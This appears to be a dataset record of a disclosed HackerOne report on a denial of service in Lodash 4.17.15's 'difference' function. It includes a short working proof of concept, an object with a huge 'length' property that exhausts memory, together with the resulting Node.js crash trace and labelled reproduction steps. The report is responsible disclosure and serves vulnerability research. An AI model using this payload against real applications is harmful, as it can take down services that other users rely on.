{
  "reported_to": "Node.js third-party modules",
  "reported_by": "spengietz ",
  "title": "Lodash \"difference\" (possibly others) Function Denial of Service Through Unvalidated Input",
  "content": "\nNOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\nI would like to report a denial of service in Lodash.\nIt allows excessive usage of the NodeJS process's memory, leading to a \"JavaScript heap out of memory\" crash. The same vulnerability exists in the browser version of Lodash and causes Firefox's tab to crash and restart and causes Chrome's tab to completely freeze and become uncloseable (from my testing at least).\nModule\nmodule name: Lodash\nversion: Only tested in 4.17.15\nnpm page: https://www.npmjs.com/package/lodash\nModule Description\nCopy description from npm page\nA modern JavaScript utility library delivering modularity, performance & extras.\nThe Lodash library exported as Node.js modules.\nModule Stats\nReplace stats below with numbers from npm\u2019s module page:\n24,853,923 downloads in the last week\nI can't find where it lists the daily/monthly downloads\nVulnerability\nVulnerability Description\nDescription about how the vulnerability was found and how it can be exploited, how it harms package users (data modification/lost, system access, other.\nThe vulnerability was discovered while pentesting a web application for a client. The Lodash \"difference\" function (https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L6947) uses the \"baseDifference\" function (https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L2764) to perform what it needs to. \"difference\" is supposed to accept two arrays (_.difference(array, [values])) but it does not actually verify whether it is dealing with valid arrays before processing the data. This means a custom malicious Object can be supplied and the function will think it is an array, allowing excessive memory consumption that ends up in a crash of the Node.js process (or crash/freeze of the browser tab in Firefox/Chrome).\nIt was found to be exploitable in the clients application because they were passing user-supplied data into the \"difference\" function, which allowed me to crash their application with this vulnerability.\nSteps To Reproduce:\nDetailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.\nBenign example:\nCode 350 Bytes\n1const _ = require('lodash')\n2\n3user_supplied_array = [1, 2, 3]\n4values_to_compare_to = {'length': 5} // An object with the \"length\" property defined to an integer will be accepted as an array by the _.difference function\n5\n6_.difference(values_to_compare_to, user_supplied_array) // This will output a new array of length 5 where each value is \"undefined\"\nBecause Lodash is essentially creating a new array of the length that we specify in \"values_to_compare_to\", we can provide a large value that will cause the Node.js process to crash before it can successfully create the array.\nWill crash Node.js example:\nCode 281 Bytes\n1const _ = require('lodash')\n2\n3user_supplied_array = [1, 2, 3]\n4values_to_compare_to = {'length': 99999999999} // This could be any huge value\n5\n6_.difference(values_to_compare_to, user_supplied_array) // The Node.js process will crash, saying that the JavaScript heap ran out of memory\nWhen the Node.js process crashes, a stack trace similar to the following is output:\nCode 1.40 KiB\n1[5515:0x55aa82652700]    41959 ms: Mark-sweep 580.0 (585.7) -> 580.0 (585.7) MB, 201.8 / 0.0 ms  allocation failure GC in old space requested\n2[5515:0x55aa82652700]    42169 ms: Mark-sweep 580.0 (585.7) -> 579.9 (584.2) MB, 209.7 / 0.0 ms  last resort GC in old space requested\n3[5515:0x55aa82652700]    42372 ms: Mark-sweep 579.9 (584.2) -> 579.9 (584.2) MB, 203.2 / 0.0 ms  last resort GC in old space requested\n4\n5\n6<--- JS stacktrace --->\n7\n8==== JS stack trace =========================================\n9\n10Security context: 0x2eaefaca5729 <JSObject>\n11    1: baseDifference [/root/temp/tmp/node_modules/lodash/lodash.js:~2764] [pc=0x11aea9f0d272](this=0x28b6ba70c0f9 <JSGlobal Object>,array=0x3dd3a43ca4c9 <Object map = 0x1294fe65a571>,values=0x3dd3a43ca4a9 <JSArray[2]>,iteratee=0x3dd3a43822d1 <undefined>,comparator=0x3dd3a43822d1 <undefined>)\n12    2: arguments adaptor frame: 2->4\n13    3: /* anonymous */ [/root/temp/tmp/node_modules/lodash/lodash.j...\n14\n15FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory\n16 1: node::Abort() [node]\n17 2: 0x55aa808c347e [node]\n18 3: v8::Utils::ReportOOMFailure(char const*, bool) [node]\n19 4: v8::internal::V8::FatalProcessOutOfMemory(char const*, bool) [node]\n20 5: v8::internal::Factory::NewUninitializedFixedArray(int) [node]\n21 6: 0x55aa80448b1d [node]\n22 7: v8::internal::Runtime_GrowArrayElements(int, v8::internal::Object**, v8::internal::Isolate*) [node]\n23 8: 0x11aea9d842fd\n24Aborted\nPatch\nIf you're able to provide a patch with the fix please post it in this section\nI don't know specifically, but it seems that proper verification that both inputs are arrays would fix this.\nSupporting Material/References:\nState all technical information about the stack where the vulnerability was found\nTested on two separate operating systems with the same end results.\nWindows:\nWindows 10\nNode.js v8.9.4\nnpm version 5.6.0\nFirefox 68.01 and Chrome 76.0.3809.100 when testing the browser version of Lodash\nLinux:\nKali Linux\nNode.js v9.0.0\nnpm version 6.1.0\nDid not test in Firefox/Chrome on this operating system\nWrap up\nSelect Y or N for the following statements:\nI contacted the maintainer to let them know: N, it said to report it here\nI opened an issue in the related repository: N, it said not to publicly disclose it until after\nImpact\nAn attacker could cause excessive resource consumption which could slow down the server for other users or they could cause an outright crash of the Node.js process, denying service to all users of the application.\n\n",
  "severity": [
    9.3,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1575506940,
  "report_url": "https://hackerone.com/reports/670779",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Require Lodash and define a benign user-supplied array: `const _ = require('lodash'); user_supplied_array = [1, 2, 3]`"
    ],
    [
      2,
      "Create a malicious object with an excessive length property: `values_to_compare_to = {'length': 99999999999}`"
    ],
    [
      3,
      "Call the vulnerable function: `_.difference(values_to_compare_to, user_supplied_array)`"
    ]
  ],
  "vuln_description": "The Lodash 'difference' function does not properly validate input arrays, allowing an attacker to pass an object with a malicious 'length' property. This causes excessive memory allocation, leading to a denial of service via process crash (Node.js) or tab freeze/crash (browsers).",
  "reason": "The vulnerability requires understanding that Lodash accepts array-like objects and that the 'length' property can be abused, but this is a straightforward memory exhaustion attack without complex interactions or state manipulation.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}